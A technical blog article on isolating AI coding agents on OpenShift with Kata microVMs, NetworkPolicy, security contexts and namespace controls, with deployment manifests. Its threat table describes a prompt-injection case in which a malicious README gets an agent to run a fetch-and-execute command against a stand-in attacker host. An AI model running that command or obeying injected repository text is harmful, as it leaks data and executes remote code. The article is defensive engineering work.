# Sandboxing AI Coding Agents on OpenShift

*Part 1 of the AgentOps series — running AI agents safely on OpenShift with microVM isolation, NetworkPolicy, and Pod Security Standards.*

---

## The technologies

This article brings together three things:

**AI coding agents** — tools like Claude Code that go beyond code suggestions. They read repositories, write code, install dependencies, run shell commands, and iterate on errors autonomously. They're not assistants waiting for instructions on each step; they're agents that take a task and execute it end to end.

**OpenShift Sandboxed Containers** — a Red Hat supported operator that brings Kata Containers to OpenShift. Instead of running containers on a shared kernel (the default), it runs each pod inside a lightweight microVM with its own dedicated kernel, using QEMU/KVM hardware virtualization.

**Defense in depth** — the principle that no single security mechanism is sufficient. Isolation needs to happen at multiple layers: hardware, kernel, container, network, namespace, and identity.

The thesis is simple: OpenShift already has what you need to run AI agents safely. You just need to wire the pieces together.

## What AI agents need

An AI coding agent isn't a typical workload. It doesn't serve HTTP requests or process queue messages. It does things that look a lot like what a developer does at a terminal:

- **Execute arbitrary shell commands** — `npm install`, `pip install`, `make`, `cargo build`
- **Modify files across a repository** — create, edit, delete, rename
- **Install system packages** — sometimes an agent decides it needs `jq` or `ripgrep`
- **Run code it just wrote** — compile, test, iterate on errors
- **Access external services** — clone repos from GitHub, pull packages from npm/PyPI

All of this happens autonomously. The agent decides what to run based on the LLM's output, which means the code being executed is **untrusted by definition** — it was generated seconds ago and hasn't been reviewed by a human.

This creates a unique threat profile:

| Threat | Example |
|---|---|
| **Prompt injection** | A malicious README tricks the agent into running `curl attacker.com/exfil \| bash` |
| **Supply chain attack** | The agent installs a typosquatted npm package that executes a reverse shell |
| **Container escape** | Generated code exploits a kernel vulnerability to break out of the container |
| **Lateral movement** | A compromised agent probes internal services, other agents, or the control plane |
| **Data exfiltration** | The agent sends source code or secrets to an external endpoint through legitimate channels |

The question isn't *if* you should isolate agents — it's how deep the isolation needs to go when you have 5, 10, or 20 of them running on shared infrastructure.

## What OpenShift already has

Here's what makes OpenShift a natural fit: most of the building blocks for agent sandboxing already exist in the platform. You're not bolting on third-party security tools — you're activating capabilities that are already there.

### CRI-O + runc (the baseline)

Every OpenShift pod runs on CRI-O with runc by default. This gives you Linux namespace isolation (separate PID, network, mount, and user namespaces), cgroup resource limits, and seccomp syscall filtering. It's solid isolation for trusted workloads.

### Security Context Constraints (SCCs)

OpenShift goes beyond vanilla Kubernetes by enforcing SCCs by default. The `restricted-v2` SCC — applied out of the box — requires non-root, drops all capabilities, forces read-only root filesystems, and enforces seccomp profiles. You'd have to configure all of this manually on upstream Kubernetes.

### SELinux (MCS isolation)

OpenShift nodes run SELinux in enforcing mode. Each container gets a unique Multi-Category Security (MCS) label, which prevents containers from accessing each other's files even if they share a volume. This is another layer that comes free with the platform.

### Pod Security Standards

OpenShift supports Kubernetes Pod Security Standards (PSS) at the namespace level. Set `pod-security.kubernetes.io/enforce: restricted` on a namespace and any pod that violates the policy gets rejected at admission time — before it ever runs.

### OVN-Kubernetes + NetworkPolicy

OpenShift's default CNI (OVN-Kubernetes) supports Kubernetes NetworkPolicy natively. You can define fine-grained ingress and egress rules per namespace or per pod label. Default deny is one YAML away.

### Namespaces + RBAC + ResourceQuota

Standard Kubernetes primitives, but OpenShift makes them easy to operationalize: dedicated namespaces per concern, RBAC roles scoped to minimal permissions, and ResourceQuotas to cap the blast radius of any single namespace.

### OpenShift Sandboxed Containers

This is the key piece that turns "good isolation" into "hardware-enforced isolation." The operator installs Kata Containers as an alternative runtime alongside CRI-O. When a pod specifies `runtimeClassName: kata`, CRI-O delegates to `containerd-shim-kata-v2`, which starts a QEMU microVM with a dedicated guest kernel.

The result: each agent pod gets its own kernel. A container escape exploit that relies on a kernel vulnerability is useless — the compromised kernel is the *guest* kernel inside the VM, not the host. The host kernel is untouched.

## The perfect match

Here's why these pieces fit together for agent sandboxing:

| Agent need | OpenShift capability | How it helps |
|---|---|---|
| Run untrusted code safely | **Sandboxed Containers (Kata)** | Each agent gets a dedicated kernel inside a microVM. Kernel exploits can't reach the host. |
| Prevent container escapes | **Kata + SCCs + SELinux** | Even if code escapes the container, it's trapped in a guest VM with SELinux enforcement. |
| Block lateral movement | **NetworkPolicy (OVN-K)** | Agents can only reach explicitly allowed services. No cross-agent traffic. No probing internal networks. |
| Limit blast radius | **Namespaces + RBAC + ResourceQuota** | Agents live in a dedicated namespace with minimal API permissions and capped resource usage. |
| Enforce security at admission | **Pod Security Standards** | Pods that don't meet the `restricted` profile are rejected before they start. |
| Grant permissions without host risk | **Kata `privileged_without_host_devices`** | `privileged: true` inside the VM doesn't grant host access. Agents can mount filesystems, run Docker, or use strace without exposing the node. |
| Scale agent count | **MachineSet + node selectors** | Bare metal nodes for Kata, regular VMs for everything else. Scale each pool independently. |
| Standard Kubernetes tooling | **It's still a pod** | `oc exec`, `oc logs`, Routes, ConfigMaps, Services — everything works the same. No special APIs. |

The critical insight: you're not choosing between security and developer experience. A Kata pod is a pod. `oc exec -it <pod> -- claude` works. `oc logs <pod>` works. The agent image is built with `oc start-build` from a standard Dockerfile. The isolation is invisible to the developer and to the agent.

```
┌─ OpenShift Node (bare metal) ──────────────────────────────┐
│                                                             │
│  Host Kernel + /dev/kvm                                     │
│                                                             │
│  ┌─ Kata MicroVM (Agent 1) ───────┐  ┌─ Kata MicroVM ───┐  │
│  │  Guest Kernel                  │  │  Guest Kernel     │  │
│  │  ┌───────────────────────────┐ │  │  ┌─────────────┐  │  │
│  │  │ Claude Code + Node.js    │ │  │  │ Agent 2     │  │  │
│  │  │ npm install, git, shell  │ │  │  │ ...         │  │  │
│  │  └───────────────────────────┘ │  │  └─────────────┘  │  │
│  └────────────────────────────────┘  └───────────────────┘  │
│                                                             │
│  ┌─ runc (regular pods) ──────────────────────────────────┐ │
│  │  Coder, MLflow, vLLM, Operators (shared host kernel)   │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

## The steps to make it happen

### Step 1: Provision bare metal nodes

Kata needs hardware virtualization — `/dev/kvm`. On cloud providers, regular VM instances don't expose it. You need bare metal.

On AWS, create a MachineSet targeting a `*.metal` instance type:

| Instance | Type | `/dev/kvm` | Kata | Cost/h |
|---|---|---|---|---|
| m6a.4xlarge | VM | No | No | $0.69 |
| g6e.4xlarge | VM | No | No | $1.86 |
| m5.metal | Bare metal | Yes | Yes | $4.61 |
| c5.metal | Bare metal | Yes | Yes | $4.08 |

`m5.metal` gives you 96 vCPUs and 384GB RAM — enough for dozens of agent microVMs. Pin agent pods with a `nodeSelector`; everything else stays on regular VMs.

### Step 2: Install the Sandboxed Containers Operator

Available from OperatorHub, `redhat-operators` catalog:

```yaml
apiVersion: operators.coreos.com/v1alpha1
kind: Subscription
metadata:
  name: sandboxed-containers-operator
  namespace: openshift-sandboxed-containers-operator
spec:
  channel: stable-1.3
  name: sandboxed-containers-operator
  source: redhat-operators
  sourceNamespace: openshift-marketplace
```

### Step 3: Create KataConfig

Once the operator CSV is ready:

```yaml
apiVersion: kataconfiguration.openshift.io/v1
kind: KataConfig
metadata:
  name: cluster-kataconfig
```

This triggers a MachineConfig update on the targeted nodes. They reboot and come back with `kata` as an available `RuntimeClass`. The operator handles the lifecycle — you don't install QEMU or configure KVM manually.

### Step 4: Create the agent namespace with security policies

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: agent-sandboxes
  labels:
    pod-security.kubernetes.io/enforce: restricted
```

Add RBAC (minimal ServiceAccount permissions), ResourceQuota (cap pods, CPU, memory), and NetworkPolicy (next step).

### Step 5: Lock down the network

Define explicit egress rules. Default deny everything, then allow only what agents need:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: agent-sandboxes-egress
  namespace: agent-sandboxes
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    # DNS (OpenShift CoreDNS: ports 53 + 5353)
    - to:
        - namespaceSelector: {}
      ports:
        - { port: 53, protocol: UDP }
        - { port: 5353, protocol: UDP }
    # Inference service (vLLM)
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: inference
      ports:
        - { port: 8080, protocol: TCP }
    # External HTTPS only (GitHub, npm) — no private ranges
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except: [10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16]
      ports:
        - { port: 443, protocol: TCP }
```

A gotcha we hit: OpenShift CoreDNS listens on port **5353**, and OVN-Kubernetes evaluates NetworkPolicy **post-DNAT**. If you only allow port 53, DNS silently breaks. Always include both.

For ingress, restrict to only the services that need to reach agents (e.g., a CDE control plane for workspace provisioning):

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: agent-sandboxes-ingress
  namespace: agent-sandboxes
spec:
  podSelector: {}
  policyTypes:
    - Ingress
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: coder
```

No cross-agent communication. No external ingress.

### Step 6: Deploy the agent

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: claude-code-standalone
  namespace: agent-sandboxes
spec:
  replicas: 1
  template:
    spec:
      runtimeClassName: kata
      nodeSelector:
        node.kubernetes.io/instance-type: m5.metal
      containers:
        - name: claude-code
          image: image-registry.openshift-image-registry.svc:5000/agent-sandboxes/claude-code-agent:latest
          resources:
            requests:
              cpu: "100m"
              memory: 256Mi
            limits:
              cpu: "1"
              memory: 2Gi
          securityContext:
            allowPrivilegeEscalation: false
            runAsNonRoot: true
            seccompProfile:
              type: RuntimeDefault
            capabilities:
              drop: ["ALL"]
```

That's it. `runtimeClassName: kata` is the only change from a regular deployment. The agent now runs inside a microVM with its own kernel, restricted to a locked-down namespace, with explicit network rules, enforced Pod Security Standards, and SELinux MCS labels.

Scale it by changing `replicas`. Each replica is an independent agent inside its own microVM.

## The result: defense in depth

Here's the full stack, from hardware to network:

```
┌─────────────────────────────────────────────────┐
│ Layer 5: NetworkPolicy (OVN-Kubernetes)         │
│   Egress restricted to known services           │
│   No cross-agent communication                  │
├─────────────────────────────────────────────────┤
│ Layer 4: Namespace + RBAC + ResourceQuota       │
│   Pod Security Standards: restricted            │
│   ServiceAccount: automountToken disabled       │
│   ResourceQuota: caps total resource usage       │
├─────────────────────────────────────────────────┤
│ Layer 3: Security context + SCCs + SELinux      │
│   Non-root, no privilege escalation             │
│   All capabilities dropped, seccomp enforced    │
│   MCS labels isolate filesystem access          │
├─────────────────────────────────────────────────┤
│ Layer 2: OpenShift Sandboxed Containers (Kata)  │
│   Dedicated guest kernel per pod (QEMU/KVM)     │
│   privileged_without_host_devices=true          │
│   Hardware-enforced memory isolation            │
├─────────────────────────────────────────────────┤
│ Layer 1: Bare metal node                        │
│   /dev/kvm for hardware virtualization          │
│   Host kernel untouched by guest workloads      │
│   Dedicated MachineSet with node selector       │
└─────────────────────────────────────────────────┘
```

If the agent's code exploits a vulnerability in Node.js, it's trapped by the container security context and SELinux. If it escapes that, it's in a guest kernel that can't reach the host. If it escapes the VM (requiring a QEMU/KVM exploit), it hits NetworkPolicy rules that block lateral movement. And those sit on top of namespace RBAC and ResourceQuota that limit the blast radius.

## Trade-offs

**Cost.** Bare metal is expensive — `m5.metal` at $4.61/hour vs $0.69/hour for a regular VM. But it gives you 96 vCPUs and 384GB RAM, enough for dozens of agents. The per-agent cost amortizes quickly, and you can scale down to zero outside business hours with MachineSet replicas.

**Startup latency.** Kata VMs take 1-2 seconds to start vs 100ms for runc. For agent workspaces that last hours, this is imperceptible.

**Memory overhead.** ~50-100MB per microVM for the guest kernel. 10 agents on a 384GB node = noise.

**Operational complexity.** The operator introduces KataConfig, MachineConfigPool updates, and node reboots. We hit a SELinux bug where the operator's `osc-monitor` DaemonSet crashes on OCP 4.20 (RHEL 8 images vs RHEL 9 host kernel). It doesn't affect the Kata runtime, but it took time to diagnose.

## What's next

The sandbox is the foundation — it prevents an agent from *escaping*. But it doesn't prevent damage *within* the sandbox: deleting the repo, committing bad code, or leaking secrets through legitimate channels.

The next articles in this series cover the rest of the stack:

- **Identity** — giving each agent a cryptographic identity (SPIFFE/Kagenti) so every action is attributable
- **Tool governance** — controlling *which* tools each agent can call through an MCP Gateway
- **Guardrails** — intercepting prompts and responses to catch PII leaks and prompt injection
- **Observability** — tracing every agent action with MLflow for audit and debugging
- **Inference** — hosting your own LLM (vLLM + Qwen) so agent traffic never leaves the cluster

---

*This article is part of the AgentOps series documenting how we run AI coding agents on OpenShift with isolation, identity, governance, and observability.*
